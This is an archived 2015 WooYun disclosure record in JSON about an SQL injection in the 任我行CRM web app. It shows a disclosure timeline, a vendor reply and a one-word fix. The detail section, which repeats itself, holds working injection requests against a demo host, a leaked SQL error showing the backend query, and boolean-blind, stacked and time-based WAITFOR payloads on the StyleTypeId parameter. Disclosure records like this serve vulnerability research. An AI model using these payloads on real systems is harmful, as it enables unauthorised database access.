{"id": 36189, "wybug_id": "wooyun-2015-0102424", "wybug_title": "任我行CRM鸡肋sql注入", "wybug_corp": "任我行CRM", "wybug_author": "路人甲", "wybug_date": "2015-03-20 12:58", "wybug_open_date": "2015-06-23 11:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-23：\t细节向公众公开  简要描述：  详细说明：   WooYun: 任我行CRM/OA的一些SQL注入漏洞 比较鸡肋，需要用户登陆。官网各个demo测试。demo2:demodemohttp://show.wecrm.com/xt/SystemManage/GetProductDataList/?pageIndex=1&pageSize=30&Keywords=&StyleTypeId='%23&Classification2=&Classification1=&MinPrice=0&MaxPrice=100000000&Classification3=&_=1426764545011{\"error\":{\"errorCode\":-1,\"message\":\"'#' 附近有语法错误。\\r\\n字符串 ' order by a.CreateDate desc\\r\\n\\t\\tset @intRecordCount=@@rowcount\\r\\n\\r\\n\\t\\tSELECT RecordCount=@intRecordCount,a.*,c.[Name] AS [Classification1Name],d.[Name] AS [Classification2Name],e.[Name] AS [Classification3Name] ,isnull(f.Name,') as DepartmentName,isnull(g.Name,') as StyleName \\r\\n\\t\\t\\tFROM [CRM_Commodity] AS a\\r\\n\\t\\t\\tLEFT JOIN [CRM_CommodityClassification1] AS c ON c.[ID] = a.[Classification1]\\r\\n\\t\\t\\tLEFT JOIN [CRM_CommodityClassification2] AS d ON d.[ID] = a.[Classification2]\\r\\n\\t\\t\\tLEFT JOIN [CRM_CommodityClassification3] AS e ON e.[ID] = a.[Classification3]\\r\\n\\t\\t\\tleft JOIN [CRM_Department] AS f ON f.[TypeID] = a.[Department]\\r\\n\\t\\t\\tleft JOIN [CRM_CommodityStyle] AS g ON g.[TypeID] = a.[Style] \\r\\n\\t\\t\\tinner JOIN\\r\\n\\t\\t\\t(SELECT TOP 30 pk\\r\\n\\t\\t\\tFROM @tblPK\\r\\n\\t\\t\\tWHERE id >=\\r\\n\\t\\t\\t\\t\\t  (\\r\\n\\t\\t\\t\\t\\t  SELECT ISNULL(MAX(id),0) \\r\\n\\t\\t\\t\\t\\t  FROM \\r\\n\\t\\t\\t\\t\\t\\t\\t(\\r\\n\\t\\t\\t\\t\\t\\t\\tSELECT TOP 1 id FROM @tblPK order by id\\r\\n\\t\\t\\t\\t\\t\\t\\t) A\\r\\n\\t\\t\\t\\t\\t  )\\r\\n\\t\\t\\tORDER BY id) tblPK ON a.id = tblPK.PK \\r\\n\\t\\t\\t order by a.CreateDate desc\\r\\n\\t\\t\\t\\t\\r\\n\\t' 后的引号不完整。\",\"errorType\":1},\"value\":null}http://show.wecrm.com/xt/SystemManage/GetProductDataList/?pageIndex=1&pageSize=30&Keywords=&StyleTypeId=%'%20AND%201579=1579%20and%20'%'='&Classification2=&Classification1=&MinPrice=0&MaxPrice=100000000&Classification3=&_=1426764545011正常返回了Place: GETParameter: StyleTypeId    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: pageIndex=1&pageSize=30&Keywords=&StyleTypeId=%' AND 1579=1579 AND '%'='&Classification2=&Classification1=&MinPrice=0&MaxPrice=100000000&Classification3=&_=1426764545011    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: pageIndex=1&pageSize=30&Keywords=&StyleTypeId=%'; WAITFOR DELAY '0:0:5'--&Classification2=&Classification1=&MinPrice=0&MaxPrice=100000000&Classification3=&_=1426764545011    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: pageIndex=1&pageSize=30&Keywords=&StyleTypeId=%' WAITFOR DELAY '0:0:5'--&Classification2=&Classification1=&MinPrice=0&MaxPrice=100000000&Classification3=&_=1426764545011---   漏洞证明：  比较鸡肋，需要用户登陆。普通用户登陆，查看消息，选择一条消息，然后点击导出到记事本。官网各个demo测试。demo1:demodemohttp://show.wecrm.com/xt/SystemManage/GetProductDataList/?pageIndex=1&pageSize=30&Keywords=&StyleTypeId='%23&Classification2=&Classification1=&MinPrice=0&MaxPrice=100000000&Classification3=&_=1426764545011{\"error\":{\"errorCode\":-1,\"message\":\"'#' 附近有语法错误。\\r\\n字符串 ' order by a.CreateDate desc\\r\\n\\t\\tset @intRecordCount=@@rowcount\\r\\n\\r\\n\\t\\tSELECT RecordCount=@intRecordCount,a.*,c.[Name] AS [Classification1Name],d.[Name] AS [Classification2Name],e.[Name] AS [Classification3Name] ,isnull(f.Name,') as DepartmentName,isnull(g.Name,') as StyleName \\r\\n\\t\\t\\tFROM [CRM_Commodity] AS a\\r\\n\\t\\t\\tLEFT JOIN [CRM_CommodityClassification1] AS c ON c.[ID] = a.[Classification1]\\r\\n\\t\\t\\tLEFT JOIN [CRM_CommodityClassification2] AS d ON d.[ID] = a.[Classification2]\\r\\n\\t\\t\\tLEFT JOIN [CRM_CommodityClassification3] AS e ON e.[ID] = a.[Classification3]\\r\\n\\t\\t\\tleft JOIN [CRM_Department] AS f ON f.[TypeID] = a.[Department]\\r\\n\\t\\t\\tleft JOIN [CRM_CommodityStyle] AS g ON g.[TypeID] = a.[Style] \\r\\n\\t\\t\\tinner JOIN\\r\\n\\t\\t\\t(SELECT TOP 30 pk\\r\\n\\t\\t\\tFROM @tblPK\\r\\n\\t\\t\\tWHERE id >=\\r\\n\\t\\t\\t\\t\\t  (\\r\\n\\t\\t\\t\\t\\t  SELECT ISNULL(MAX(id),0) \\r\\n\\t\\t\\t\\t\\t  FROM \\r\\n\\t\\t\\t\\t\\t\\t\\t(\\r\\n\\t\\t\\t\\t\\t\\t\\tSELECT TOP 1 id FROM @tblPK order by id\\r\\n\\t\\t\\t\\t\\t\\t\\t) A\\r\\n\\t\\t\\t\\t\\t  )\\r\\n\\t\\t\\tORDER BY id) tblPK ON a.id = tblPK.PK \\r\\n\\t\\t\\t order by a.CreateDate desc\\r\\n\\t\\t\\t\\t\\r\\n\\t' 后的引号不完整。\",\"errorType\":1},\"value\":null}http://show.wecrm.com/xt/SystemManage/GetProductDataList/?pageIndex=1&pageSize=30&Keywords=&StyleTypeId=%'%20AND%201579=1579%20and%20'%'='&Classification2=&Classification1=&MinPrice=0&MaxPrice=100000000&Classification3=&_=1426764545011正常返回了Place: GETParameter: StyleTypeId    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: pageIndex=1&pageSize=30&Keywords=&StyleTypeId=%' AND 1579=1579 AND '%'='&Classification2=&Classification1=&MinPrice=0&MaxPrice=100000000&Classification3=&_=1426764545011    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: pageIndex=1&pageSize=30&Keywords=&StyleTypeId=%'; WAITFOR DELAY '0:0:5'--&Classification2=&Classification1=&MinPrice=0&MaxPrice=100000000&Classification3=&_=1426764545011    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: pageIndex=1&pageSize=30&Keywords=&StyleTypeId=%' WAITFOR DELAY '0:0:5'--&Classification2=&Classification1=&MinPrice=0&MaxPrice=100000000&Classification3=&_=1426764545011---   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-03-25 11:45 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}